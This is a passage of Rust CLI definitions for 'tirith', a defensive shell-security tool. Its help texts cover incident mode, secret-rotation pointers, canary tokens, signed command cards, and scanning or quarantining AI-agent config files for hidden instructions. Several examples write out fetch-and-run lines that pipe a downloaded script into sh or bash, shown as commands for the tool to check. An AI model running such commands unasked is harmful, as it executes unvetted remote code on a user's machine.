    #[command(hide = true)]
    Host,

    /// Write the per-OS Chrome Native Messaging Host manifest (dry-run unless --apply)
    #[command(
        name = "install-extension",
        after_help = "\
Writes the Chrome Native Messaging Host manifest (sh.tirith.browser.json) that
lets the companion extension launch `tirith browser host`. Without --apply the
manifest + target path are printed (dry-run). With --apply the manifest is
written to the per-OS NativeMessagingHosts directory (the targeted path is
always printed). --browser selects the Chromium-family browser:
  chrome (default): macOS ~/Library/Application Support/Google/Chrome/...
                    Linux ~/.config/google-chrome/...
  chromium:         .../Chromium/...        Linux ~/.config/chromium/...
  brave:            .../BraveSoftware/Brave-Browser/...
  edge:             .../Microsoft Edge/...  Linux ~/.config/microsoft-edge/...
  Windows: registry-based — guidance is printed, the registry is NOT modified.

The extension id authorizes which extension may connect; pass --extension-id
<id> (a real id is 32 letters a–p) or a clearly-marked placeholder is used. A
malformed id is rejected. The write is idempotent.

Examples:
  tirith browser install-extension
  tirith browser install-extension --apply
  tirith browser install-extension --browser brave --apply
  tirith browser install-extension --extension-id abcdefghijklmnopabcdefghijklmnop --apply
  tirith browser install-extension --json"
    )]
    InstallExtension {
        /// Chrome extension id allowed to connect (32 letters a–p). Defaults to
        /// a documented placeholder when omitted. A malformed id is rejected.
        #[arg(long)]
        extension_id: Option<String>,
        /// Which Chromium-family browser's NativeMessagingHosts directory to
        /// target: chrome (default), chromium, brave, or edge.
        #[arg(long, default_value = "chrome")]
        browser: String,
        /// Actually write the manifest (creating the directory). Without this
        /// flag the manifest is printed for inspection.
        #[arg(long)]
        apply: bool,
        /// Emit a JSON envelope instead of human text.
        #[arg(long)]
        json: bool,
    },
}

#[derive(Subcommand)]
enum IncidentAction {
    /// Declare an incident: flip fail-closed and disable the TIRITH=0 bypass
    #[command(after_help = "\
Declares an incident by writing a flag file at state_dir()/incident_active.json.
While active, the runtime policy is forced fail-closed, the TIRITH=0 bypass is
disabled (both interactivity modes), and a curated set of existing rules is
elevated. A second `start` while one is already active fails (exit 1) with
'already active since X' — it never overwrites the original reason/start time.

Examples:
  tirith incident start
  tirith incident start --reason \"suspicious paste from teammate\"
  tirith incident start --json")]
    Start {
        /// Free-text reason recorded in the flag file (stored verbatim).
        #[arg(long)]
        reason: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// End the active incident and restore the normal policy (ALWAYS works)
    #[command(after_help = "\
Ends the incident by deleting the flag file and restoring the normal policy.
Prompts for confirmation unless --yes is passed. Logs the stop to the audit log.

LOCKOUT SAFETY: this is a plain filesystem deletion with NO `check` and NO
policy gating, so it always succeeds even when the incident has the policy
fail-closed and the bypass disabled.

Examples:
  tirith incident stop
  tirith incident stop --yes")]
    Stop {
        /// Skip the confirmation prompt.
        #[arg(long)]
        yes: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show whether an incident is active, plus its reason + start time
    #[command(after_help = "\
Examples:
  tirith incident status
  tirith incident status --json")]
    Status {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Write a markdown incident report (timeline, state, top findings)
    #[command(after_help = "\
Writes a markdown report covering: the audit timeline since the incident
started, the top recent findings, the current persistence / env / PATH / hook /
canary state, and an 'Actions taken' checklist for you to fill in. Embedded
command text comes only from the audit log's already-REDACTED field — full
commands are never reconstructed. With no --out the report prints to stdout.

Examples:
  tirith incident report
  tirith incident report --out incident-2026-05-28.md")]
    Report {
        /// Write the report to this path instead of stdout (0600 on Unix).
        #[arg(long)]
        out: Option<std::path::PathBuf>,
        /// Output format for the status line (default: human; report body is
        /// always markdown).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum SecretAction {
    /// Scan recent audit findings and print a rotation next-step per leak
    #[command(after_help = "\
Reads RECENT credential-type findings from the local audit log and prints a
one-line rotation next-step for each, attributing the leak to a provider where
the shape is recognizable. ZERO network calls. tirith does NOT perform rotation
or revocation — it points you at the right revocation page; YOU rotate.

Only the engine's already-REDACTED command text is read; raw secret values are
never seen. Exit code 0 whether or not findings exist (1 only if the audit log
cannot be read).

Examples:
  tirith secret triage
  tirith secret triage --verbose
  tirith secret triage --json")]
    Triage {
        /// Show extra detail per finding (redacted text, docs URL, verified date).
        #[arg(long)]
        verbose: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show a provider's revocation URL, docs, and manual rotation checklist
    #[command(after_help = "\
Prints where to revoke/regenerate the credential, the provider's docs, and the
step-by-step checklist YOU perform. ZERO network calls — the URLs are inert
strings. tirith does NOT perform rotation or revocation; YOU do.

<provider> is one of: aws, github, npm, pypi, cargo, stripe, slack, openai,
anthropic, gcp, azure. An unknown provider errors with the valid list.

--verbose additionally shows the guidance's last_verified date and the
triage shapes used to attribute leaks to this provider.

Examples:
  tirith secret rotate github
  tirith secret rotate aws --verbose
  tirith secret rotate stripe --json")]
    Rotate {
        /// The provider to rotate (aws, github, npm, pypi, cargo, stripe,
        /// slack, openai, anthropic, gcp, azure).
        provider: String,
        /// Show the guidance's last_verified date and triage shapes.
        #[arg(long)]
        verbose: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Lead with a provider's revocation URL, then the checklist
    #[command(after_help = "\
Like `rotate`, but leads with the revocation URL prominently. ZERO network
calls. tirith does NOT perform rotation or revocation — it shows you the page;
YOU revoke.

--provider is one of: aws, github, npm, pypi, cargo, stripe, slack, openai,
anthropic, gcp, azure. An unknown provider errors with the valid list.

Examples:
  tirith secret revoke --provider aws
  tirith secret revoke --provider github --json")]
    Revoke {
        /// The provider to revoke (aws, github, npm, pypi, cargo, stripe,
        /// slack, openai, anthropic, gcp, azure).
        #[arg(long)]
        provider: String,
        /// Show the guidance's last_verified date.
        #[arg(long)]
        verbose: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum AiAction {
    /// Run the `ai-agent-repo` scan profile over the repo's AI-config files
    #[command(after_help = "\
Runs the AI-config subset of the shipping scan engine — the `ai-agent-repo`
built-in profile — over the current repository's AI-config files. This is a thin
wrapper over `tirith scan --profile ai-agent-repo`; no new detection is added.
Exit code follows the profile's `fail_on` (high).

Examples:
  tirith ai scan
  tirith ai scan --json")]
    Scan {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Diff the repo's AI-config files against the last-known-safe snapshot
    #[command(after_help = "\
Compares each current AI-config file to the snapshot recorded at
<state-dir>/ai_config_snapshot.json and reports added / removed instruction
lines plus any AI-config drift findings (ai_config_hidden_instruction_added,
ai_config_tool_use_escalation). Both sides are NORMALIZED before diffing, so a
pure Markdown reformat is not reported as drift. If no snapshot exists, says so
and suggests `tirith ai snapshot --update`. Exits 1 when a drift rule fired.

Examples:
  tirith ai diff
  tirith ai diff --json")]
    Diff {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Isolate a suspected-poisoned AI-config file (COPY by default)
    #[command(after_help = "\
v1 DEFAULT IS COPY: the file is COPIED to
<cache-dir>/tirith/quarantine/<timestamp>-<sha256>-<basename> and the ORIGINAL IS
LEFT UNTOUCHED; the restore command is printed. Pass --move to opt into the
destructive variant (copy, then DELETE the original) — which prompts for
confirmation unless --yes, and refuses non-interactively without --yes.

Examples:
  tirith ai quarantine .cursorrules
  tirith ai quarantine CLAUDE.md --json
  tirith ai quarantine .cursorrules --move --yes")]
    Quarantine {
        /// Path to the AI-config file to quarantine.
        file: String,
        /// Opt into the DESTRUCTIVE variant: copy, then remove the original.
        /// Prompts for confirmation unless --yes; refuses non-interactively
        /// without --yes. Without this flag the original is left untouched.
        #[arg(long = "move")]
        r#move: bool,
        /// Confirm the destructive --move without an interactive prompt.
        /// Meaningless without --move, so clap requires it.
        // Internal: M13 PR #132 finding O (kept out of `--help`).
        #[arg(long, requires = "move")]
        yes: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Explain which AI tool a config file configures and what it grants
    #[command(after_help = "\
Identifies which AI tool a config file configures (CLAUDE.md → Claude,
.cursorrules / .cursor/rules → Cursor, AGENTS.md → generic, .mcp.json → MCP) and
prints the capabilities / risks its CONTENT grants — hidden instructions,
tool-use / network / file-write directives, MCP server-launch surface. Reuses
the shipping aifile detection for the risk signals.

Examples:
  tirith ai explain-config CLAUDE.md
  tirith ai explain-config .mcp.json --json")]
    ExplainConfig {
        /// Path to the AI-config file to explain.
        file: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show the AI-config snapshot, or (--update) record a fresh one
    #[command(after_help = "\
Without --update: shows the current snapshot's path, age, and file count.
With --update: re-scans the AI-config files and records a fresh snapshot at
<state-dir>/ai_config_snapshot.json, written atomically. --update REFUSES to
snapshot if the scan finds any High+ issue (so you do not bless a compromised
state) unless --force is also passed.

Examples:
  tirith ai snapshot
  tirith ai snapshot --json
  tirith ai snapshot --update
  tirith ai snapshot --update --force")]
    Snapshot {
        /// Re-scan the AI-config files and record a fresh snapshot.
        #[arg(long)]
        update: bool,
        /// With --update, record the snapshot even when High+ issues are found
        /// (otherwise --update refuses to bless a compromised state).
        /// Meaningless without --update, so clap requires it.
        // Internal: M13 PR #132 finding O (kept out of `--help`).
        #[arg(long, requires = "update")]
        force: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum CanaryAction {
    /// Generate and store a fresh synthetic canary token
    #[command(after_help = "\
Generates a clearly-synthetic token of the chosen kind, stores it in the local
canary store, and prints the token so you can plant it. The token can never be
mistaken for a real credential (see docs/canary-formats.md).

<kind> is one of: aws-like, github-like, gcp-like, env-line, private-key-shaped.

--callback-url is OPT-IN and must be a URL YOU self-host (http/https). On
detection, a best-effort POST of {kind, detected_at, context} (NEVER the token
value) is sent to it; failures are logged and never block. Omit it for the
local-only default (no network ever).

Examples:
  tirith canary create aws-like
  tirith canary create github-like --callback-url https://my-host.example/hit
  tirith canary create env-line --json")]
    Create {
        /// The token kind: aws-like, github-like, gcp-like, env-line, or
        /// private-key-shaped.
        kind: String,
        /// OPT-IN, user-self-hosted callback URL (http/https). On detection a
        /// best-effort POST of {kind, detected_at, context} — never the token
        /// value — is sent here. Omit for local-only (the default).
        #[arg(long = "callback-url")]
        callback_url: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show a compact canary summary (count, callbacks, store path)
    #[command(after_help = "\
Prints how many canaries are registered, how many use an opt-in callback, and
where the store lives. Does NOT print token values (use `tirith canary list`).

Examples:
  tirith canary status
  tirith canary status --json")]
    Status {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// List every registered canary (id, kind, token, callback)
    #[command(after_help = "\
Examples:
  tirith canary list
  tirith canary list --json")]
    List {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Remove one canary by id (prompts for confirmation)
    #[command(after_help = "\
Prompts before removing unless --yes is passed. In a non-interactive shell
without --yes the removal is refused (no silent prune). In --json mode, --yes is
required to confirm. A pruned canary's token stops firing.

Examples:
  tirith canary prune a1b2c3d4e5f6
  tirith canary prune a1b2c3d4e5f6 --yes")]
    Prune {
        /// The canary id to remove (from `tirith canary list`).
        id: String,
        /// Skip the confirmation prompt.
        #[arg(long)]
        yes: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Regenerate a canary's token, keeping its id and callback URL
    #[command(after_help = "\
Generates a fresh token of the SAME kind for an existing canary, preserving the
id and any callback URL. The OLD token stops firing; the NEW one fires going
forward. Use after a canary hit to re-arm the bait.

Exit codes:
  0  rotated (fresh token generated)
  1  no canary with that id

Examples:
  tirith canary rotate a1b2c3d4e5f6
  tirith canary rotate a1b2c3d4e5f6 --json")]
    Rotate {
        /// The canary id to rotate (from `tirith canary list`).
        id: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum CommandCardAction {
    /// Build an unsigned command card and print it as JSON
    #[command(after_help = "\
Flag-driven when --command is supplied; otherwise prompts for the command on
the terminal. The card is printed as pretty JSON on stdout, so you can redirect
it to a file. Sign it next with `tirith command-card sign`.

If --expires is omitted, the card expires 90 days from today.

Examples:
  tirith command-card create --command 'curl -fsSL https://example.com/install.sh | sh' > card.json
  tirith command-card create --command 'sh ./setup.sh' --requires-sudo --writes /etc/foo
  tirith command-card create --command 'x' --expected-domain example.com --expected-domain github.com/example/project")]
    Create {
        /// The exact command the card attests to. Prompts if omitted.
        #[arg(long)]
        command: Option<String>,
        /// A domain (or host/path prefix) the command is expected to contact.
        /// Repeatable.
        #[arg(long = "expected-domain")]
        expected_domain: Vec<String>,
        /// SHA-256 (hex) of the script the command downloads/pipes, if any.
        /// RECORDED-BUT-NOT-ENFORCED in v1: it is part of the signed
        /// attestation, but `tirith check` does NOT fetch the script to compare
        /// it (the hot path never makes network calls). v1 verifies only the
        /// signature, expiry, and exact command.
        #[arg(long)]
        script_sha256: Option<String>,
        /// A filesystem path the command is expected to write. Repeatable.
        #[arg(long = "writes")]
        writes: Vec<String>,
        /// Mark the command as legitimately requiring sudo.
        #[arg(long)]
        requires_sudo: bool,
        /// Expiry date (YYYY-MM-DD). Defaults to 90 days from today.
        #[arg(long)]
        expires: Option<String>,
        /// Output format (default: human; the card itself is always JSON).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Sign a command card in place with an ed25519 private key
    #[command(after_help = "\
Reads the card JSON, signs the canonical (signature-cleared) payload with the
supplied ed25519 private key, and rewrites the file with the `signature` block
populated (algo, key_id, hex value). The key file may be 32 raw bytes, hex, or
base64. The key_id stamped on the card is the first 16 hex chars of
sha256(public-key).

Examples:
  tirith command-card sign --key ed25519-priv.bin install-card.json")]
    Sign {
        /// Path to the ed25519 private key (32 raw bytes, hex, or base64).
        #[arg(long)]
        key: String,
        /// Path to the card JSON to sign in place.
        card: String,
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Verify a command card against your trusted-card-keys directory
    #[command(after_help = "\
Verifies the card's ed25519 signature against a public key under
`trusted-card-keys/<key_id>.pub` in tirith's config dir (`~/.config/tirith/` on
Linux; the platform config dir on macOS/Windows) and checks the card has not
expired. Does NOT check the command — use `tirith check --card` for the
command-vs-card match.

Exit codes:
  0  verified (trusted key, good signature, not expired)
  1  NOT verified (untrusted key / bad signature / expired / unsigned)

Examples:
  tirith command-card verify install-card.json
  tirith command-card verify install-card.json --json")]
    Verify {
        /// Path to the card JSON to verify.
        card: String,
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Download a card from a URL into the local cache (the ONLY fetch path)
    #[command(after_help = "\
Downloads the card from <url> (30s timeout, 10 MiB cap, redirect-limited),
validates it parses as a card, and caches it under tirith's cache directory at
`cards/<sha256>.json` (the platform cache dir — e.g. ~/.cache on Linux,
~/Library/Caches on macOS). Prints the cached path on stdout so you can pass it
to `tirith check --card`.

This is the ONLY place tirith fetches a card over the network. `tirith check`
never fetches — it reads cards from disk only.

PRIVACY: fetching reveals to the maintainer's domain that a tirith user is
pulling their card (your IP + a timestamp). This is inherent to fetching a
remote resource.

Examples:
  tirith command-card fetch https://example.com/install-card.json
  CARD=$(tirith command-card fetch https://example.com/install-card.json)
  tirith check --card \"$CARD\" -- 'curl -fsSL https://example.com/install.sh | sh'")]
    // Unix-only: reuses the `#[cfg(unix)]` hardened `runner::download_to_path`.
    #[cfg(unix)]
    Fetch {
        /// URL of the card to download.
        url: String,
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum RepoCommandsAction {
    /// Write a starter .tirith/commands.yaml for this repo
    #[command(after_help = "\
Writes a starter manifest with example `allowed[]` and `dangerous[]` entries to
<repo-root>/.tirith/commands.yaml (or the current directory when not in a git
repo). Refuses to overwrite an existing file unless --force is passed, so a
hand-edited manifest is never clobbered.

Examples:
  tirith commands init
  tirith commands init --force")]
    Init {
        /// Overwrite an existing .tirith/commands.yaml.
        #[arg(long)]
        force: bool,
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// List the catalogued allowed[] / dangerous[] entries
    #[command(after_help = "\
Prints the `allowed[]` commands (name + command) and `dangerous[]` glob
patterns from this repo's .tirith/commands.yaml.

Examples:
  tirith commands list
  tirith commands list --json")]
    List {
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Run an allowed[] command by name (re-checked through the engine first)
    #[command(after_help = "\
Looks up the named entry under `allowed[]` and executes its command through the
shell. Being on the allowlist suppresses only the `repo_command_unknown`
annotation — it does NOT make a command safe to run blindly, so the resolved
command is re-checked through the engine first and REFUSED if tirith blocks it
(a `dangerous[]` match or any real High/Critical finding). The run is audited.

Examples:
  tirith commands run test
  tirith commands run build")]
    Run {
        /// The `allowed[].name` of the command to run.
        name: String,
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Evaluate an arbitrary command against the manifest + engine
    #[command(after_help = "\
Evaluates the command after `--` against this repo's .tirith/commands.yaml AND
the full tirith engine. An uncatalogued command surfaces an Info
`repo_command_unknown`; a `dangerous[]` glob match adds a blocking
`repo_command_dangerous_pattern`; a command the engine flags High/Critical
blocks regardless of the manifest. Exit code follows the verdict
(0 allow, 1 block, 2 warn).

Examples:
  tirith commands check -- \"npm run build\"
  tirith commands check -- \"curl https://example.com/install.sh | bash\"")]
    Check {
        /// Shell dialect for tokenization (posix, powershell, fish).
        #[arg(long, default_value = "posix")]
        shell: String,
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
        /// The command to evaluate (everything after `--`).
        #[arg(last = true, required = true)]
        cmd: Vec<String>,
    },
}

#[derive(Subcommand)]
enum TaintAction {
    /// List every recorded tainted file
    #[command(after_help = "\
Examples:
  tirith taint list
  tirith taint list --json")]
    List {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show the recorded taint mark for one file (where it came from)
    #[command(after_help = "\
Exit codes:
  0  the file is NOT tainted.
  1  the file IS tainted (review it, then `tirith taint clear <file>`).

Examples:
  tirith taint explain ./install.sh
  tirith taint explain ./install.sh --json")]
    Explain {
        /// Path to inspect.
        file: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Remove the taint mark for one file (prompts for confirmation)
    #[command(after_help = "\
Prompts before removing the mark unless --yes is passed. In a non-interactive
shell without --yes the removal is refused (no silent clear). In --json mode,
--yes is required to confirm.

Examples:
  tirith taint clear ./install.sh
  tirith taint clear ./install.sh --yes")]
    Clear {
        /// Path whose taint mark to remove.
        file: String,
        /// Skip the confirmation prompt.
        #[arg(long)]
        yes: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum BaselineAction {
    /// Turn the opt-in anomaly baseline ON (sets policy.baseline_enabled = true)
    #[command(after_help = "\
Enables learning. After this, tirith records a privacy-hashed observation for
every detection-rule firing and surfaces an Info 'first time / rare for you'
note for novel patterns. No raw hostnames or paths are stored — only salted
hashes. It never blocks. Expect early-baseline mode (everything looks new)
until the window fills in.

Examples:
  tirith baseline learn
  tirith baseline learn --json")]
    Learn {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show the top 20 patterns (privacy-hashed) and the enabled flag
    #[command(after_help = "\
Prints whether the baseline is enabled, how many observations are in the 90-day
window, an early-baseline-mode note while the window is sparse, and the top 20
patterns by count. All identifying fields are salted-sha256 hashes — never raw
hostnames or paths.

Examples:
  tirith baseline status
  tirith baseline status --json")]
    Status {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Zero the baseline store (prompts for confirmation)
    #[command(after_help = "\
Removes every recorded observation. Prompts before zeroing unless --yes is
passed. In a non-interactive shell without --yes the reset is refused (no silent
zero). In --json mode, --yes is required to confirm. The per-install salt is
left in place.

Examples:
  tirith baseline reset
  tirith baseline reset --yes")]
    Reset {
        /// Skip the confirmation prompt.
        #[arg(long)]
        yes: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum ContextAction {
    /// List the active kube / aws / gcp / azure contexts + their labels
    #[command(after_help = "\
Examples:
  tirith context status
  tirith context status --json")]
    Status {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Turn the operational-context rule on or off (writes to policy.yaml)
    #[command(after_help = "\
Examples:
  tirith context guard on
  tirith context guard off
  tirith context guard status")]
    Guard {
        /// One of: on, off, status.
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Label a `provider:context` entry with a criticality string
    #[command(after_help = "\
Provider is one of: kube, aws, gcp, azure.
Criticality is one of: critical, production, prod, live, p0, p1, p2, staging, dev, test
(case-insensitive; the first six are the values that fire the guard rule).

Examples:
  tirith context label kube:prod-us-east critical --scope user
  tirith context label aws:prod production --scope user
  tirith context label gcp:svc@my-prod-project critical --scope repo")]
    Label {
        /// `provider:context` key (e.g. `kube:prod-us-east`).
        label_key: String,
        /// Criticality string. `critical` / `production` / `prod` / `live`
        /// / `p0` / `p1` trigger the guard rule; others (`staging`, `dev`,
        /// `test`, `p2`) record the label without enforcement.
        criticality: String,
        /// Where to write the label file. `user` →
        /// `~/.config/tirith/context-labels.yaml`. `repo` →
        /// `<repo>/.tirith/context-labels.yaml`.
        #[arg(long, default_value = "user")]
        scope: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum SshAction {
    /// Turn the operational-context rule on or off (shared with `tirith context guard`)
    #[command(after_help = "\
Examples:
  tirith ssh guard on
  tirith ssh guard off
  tirith ssh guard status

Note: This flips the SAME `context_guard_enabled` policy field that
`tirith context guard` operates on — there is one operator switch for
both cloud-CLI and SSH operational-context rules.")]
    Guard {
        /// One of: on, off, status.
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Label an SSH host (or `user@host`) with a criticality string
    #[command(after_help = "\
Criticality is one of: critical, production, prod, live, p0, p1, p2,
staging, dev, test (case-insensitive; the first six fire the guard rule).

`~/.ssh/config` aliases are resolved at label time via `ssh -G <host>` so
the labels file stores the final hostname; an operator who labels
`prod-host` and later runs `ssh prod-host.example.com` still gets a match.

Examples:
  tirith ssh label payments-prod-01 critical --scope user
  tirith ssh label root@payments-prod-01 critical --scope repo
  tirith ssh label prod-shortname production --scope user")]
    Label {
        /// SSH host (bare host or `user@host`). May be an `~/.ssh/config`
        /// alias — `ssh -G <host>` resolves the canonical hostname at
        /// label time.
        host: String,
        /// Criticality string. `critical` / `production` / `prod` / `live`
        /// / `p0` / `p1` trigger the guard rule; others (`staging`, `dev`,
        /// `test`, `p2`) record the label without enforcement.
        criticality: String,
        /// Where to write the label file. `user` →
        /// `~/.config/tirith/ssh-host-labels.yaml`. `repo` →
        /// `<repo>/.tirith/ssh-host-labels.yaml`.
        #[arg(long, default_value = "user")]
        scope: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Cross-host binary bootstrap — deferred to M8.1
    #[command(after_help = "\
DEFERRED to the M8.1 follow-up PR. Cross-host binary deploy needs PATH /
libc / sudoers field validation that hasn't shipped yet. For now use
`tirith ssh label <host> <criticality>` to label the host and run
`tirith ssh guard on` to enable the rule.")]
    Bootstrap {
        /// Target host (bare host or `user@host`).
        target: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum IacAction {
    /// Turn the shared operational-context rule on or off
    #[command(after_help = "\
Examples:
  tirith iac guard on
  tirith iac guard off
  tirith iac guard status

Note: This flips the SAME `context_guard_enabled` policy field that
`tirith context guard` and `tirith ssh guard` operate on — one operator
switch silences ALL operational-context findings (cloud CLI, SSH, IaC).")]
    Guard {
        /// One of: on, off, status.
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Parse a saved IaC plan, record its SHA-256, and report the change summary
    #[command(after_help = "\
Examples:
  tirith iac check-plan tfplan
  tirith iac check-plan --tool pulumi ./plan.json
  tirith iac check-plan --json tfplan

Tool detection:
  Auto-detected from sibling files in the plan's parent directory
  (`Pulumi.yaml` → pulumi, `tofu.lock.hcl` → tofu, otherwise terraform).
  Pass `--tool` to override.")]
    CheckPlan {
        /// Path to the saved plan file. Terraform binary plans are
        /// passed to `terraform show -json` for parsing; Pulumi JSON
        /// plans are read directly.
        plan: std::path::PathBuf,

        /// Force a specific tool (terraform | pulumi | tofu). When
        /// unset, the tool is detected from sibling files.
        #[arg(long)]
        tool: Option<String>,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Toggle the plan-before-apply gate (engine refuses bare `apply`)
    #[command(after_help = "\
When ON, `terraform apply` (no plan file) fires `iac_apply_without_plan`
at High severity; `terraform apply tfplan` where the file's SHA-256
does NOT match a `tirith iac check-plan`-recorded hash fires
`iac_plan_hash_mismatch` at High severity.

Examples:
  tirith iac require-plan-before-apply on
  tirith iac require-plan-before-apply off
  tirith iac require-plan-before-apply status")]
    RequirePlanBeforeApply {
        /// One of: on, off, status.
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
